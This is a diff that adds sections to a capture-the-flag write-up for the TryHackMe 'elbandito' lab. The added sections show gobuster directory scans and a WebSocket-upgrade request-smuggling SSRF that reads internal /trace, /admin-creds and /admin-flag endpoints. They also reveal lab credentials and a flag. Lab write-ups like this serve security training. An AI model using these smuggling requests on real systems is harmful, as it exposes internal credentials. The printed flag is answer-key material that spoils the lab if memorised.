@@ -204,6 +204,56 @@ Starting gobuster in directory enumeration mode
 /envelope_small.htm   (Status: 403) [Size: 146]
 ```
 
+And another one :
+
+```BASH
+gobuster dir -u http://elbandito.thm:8080/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://elbandito.thm:8080/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/info                 (Status: 200) [Size: 2]
+/admin                (Status: 403) [Size: 146]
+/assets               (Status: 200) [Size: 0]
+/health               (Status: 200) [Size: 150]
+/traceroute           (Status: 403) [Size: 146]
+/trace                (Status: 403) [Size: 146]
+/environment          (Status: 403) [Size: 146]
+/administration       (Status: 403) [Size: 146]
+/envelope_small       (Status: 403) [Size: 146]
+/error                (Status: 500) [Size: 88]
+/envelope             (Status: 403) [Size: 146]
+/administrator        (Status: 403) [Size: 146]
+/metrics              (Status: 403) [Size: 146]
+/envolution           (Status: 403) [Size: 146]
+/env                  (Status: 403) [Size: 146]
+/dump                 (Status: 403) [Size: 146]
+/tracert              (Status: 403) [Size: 146]
+/administr8           (Status: 403) [Size: 146]
+/environmental        (Status: 403) [Size: 146]
+/administrative       (Status: 403) [Size: 146]
+/tracer               (Status: 403) [Size: 146]
+/administratie        (Status: 403) [Size: 146]
+/token                (Status: 200) [Size: 8]
+/admins               (Status: 403) [Size: 146]
+/admin_images         (Status: 403) [Size: 146]
+/envelopes            (Status: 403) [Size: 146]
+/administrivia        (Status: 403) [Size: 146]
+/beans                (Status: 403) [Size: 146]
+/env40x40             (Status: 403) [Size: 146]
+/traces               (Status: 403) [Size: 146]
+```
+
 On the service page we have zhis request :
 ![[Pasted image 20250329161122.png]]
 
@@ -215,6 +265,32 @@ Port `80`
 ![[Pasted image 20250328182120.png]]
 ![[Pasted image 20250328182607.png]]
 
+We also make a #gobuster scan :
+
+```BASH
+gobuster dir -u https://elbandito.thm:80 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -k
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     https://elbandito.thm:80
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/login                (Status: 405) [Size: 153]
+/static               (Status: 301) [Size: 169] [--> http://elbandito.thm/static/]
+/access               (Status: 200) [Size: 4817]
+/messages             (Status: 302) [Size: 189] [--> /]
+/logout               (Status: 302) [Size: 189] [--> /]
+/save                 (Status: 405) [Size: 153]
+/ping                 (Status: 200) [Size: 4]
+```
 
 
 Port `631`
@@ -250,8 +326,109 @@ HTTPServer(("", int(sys.argv[1])), Redirect).serve_forever()
 
 For the #SSRF on the port `8080` we saw that the server use websocket so we need to update our request :
 
+```HTTP
+GET /isOnline?url=http://10.10.36.85:5555 HTTP/1.1
+Host: elbandito.thm:8080
+Accept-Language: en-GB,en;q=0.9
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
+Accept: */*
+Accept-Encoding: gzip, deflate, br
+Sec-WebSocket-Version: 777
+Upgrade: WebSocket
+Connection: keep-alive, Upgrade
+Sec-WebSocket-Key: nf6dB8Pb/BLinZ7UexUXHg==
+
+GET /trace HTTP/1.1
+Host: elbandito.thm:8080
+
+
+```
+
+Output :
+
+```JSON
+{"timestamp":1743262000827,"info":{"method":"GET","path":"/admin-creds","headers":{"request":{"host":"0.0.0.0:8081","user-agent":"Wget","connection":"close"},"response":{"X-Application-Context":"application:8081","Content-Type":"text/plain","Content-Length":"55","Date":"Sat, 29 Mar 2025 15:26:40 GMT","Connection":"close","status":"200"}}}},{"timestamp":1743262000826,"info":{"method":"GET","path":"/admin-flag","headers":{"request":{"host":"0.0.0.0:8081","user-agent":"Wget","connection":"close"},"response":{"X-Application-Context":"application:8081","Content-Type":"text/plain","Content-Length":"43","Date":"Sat, 29 Mar 2025 15:26:40 GMT","Connection":"close","status":"200"}}}},
+```
+
+We have a page named admin-creds and admin-flag.
 
 ## 4. **Exploitation
+
+With #SSRF on the port `8080`:
+
+```HTTP
+GET /isOnline?url=http://10.10.36.85:5555 HTTP/1.1
+Host: elbandito.thm:8080
+Accept-Language: en-GB,en;q=0.9
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
+Accept: */*
+Accept-Encoding: gzip, deflate, br
+Sec-WebSocket-Version: 777
+Upgrade: WebSocket
+Connection: keep-alive, Upgrade
+Sec-WebSocket-Key: nf6dB8Pb/BLinZ7UexUXHg==
+
+GET /admin-creds HTTP/1.1
+Host: elbandito.thm:8080
+
+
+```
+
+Output :
+
+```HTTP
+HTTP/1.1 101 
+Server: nginx
+Date: Sat, 29 Mar 2025 15:31:47 GMT
+Connection: upgrade
+X-Application-Context: application:8081
+
+HTTP/1.1 200 
+X-Application-Context: application:8081
+Content-Type: text/plain
+Content-Length: 55
+Date: Sat, 29 Mar 2025 15:31:47 GMT
+
+username:hAckLIEN password:YouCanCatchUsInYourDreams404
+```
+
+```HTTP
+GET /isOnline?url=http://10.10.36.85:5555 HTTP/1.1
+Host: elbandito.thm:8080
+Accept-Language: en-GB,en;q=0.9
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
+Accept: */*
+Accept-Encoding: gzip, deflate, br
+Sec-WebSocket-Version: 777
+Upgrade: WebSocket
+Connection: keep-alive, Upgrade
+Sec-WebSocket-Key: nf6dB8Pb/BLinZ7UexUXHg==
+
+GET /admin-flag HTTP/1.1
+Host: elbandito.thm:8080
+
+
+```
+
+Output :
+
+```HTTP
+HTTP/1.1 101 
+Server: nginx
+Date: Sat, 29 Mar 2025 15:33:22 GMT
+Connection: upgrade
+X-Application-Context: application:8081
+
+HTTP/1.1 200 
+X-Application-Context: application:8081
+Content-Type: text/plain
+Content-Length: 43
+Date: Sat, 29 Mar 2025 15:33:22 GMT
+
+THM{:::MY_DECLINATION:+62°_14\'_31.4'':::}
+```
+
+We have the first flag.
 
 ## 5. **Installation
 
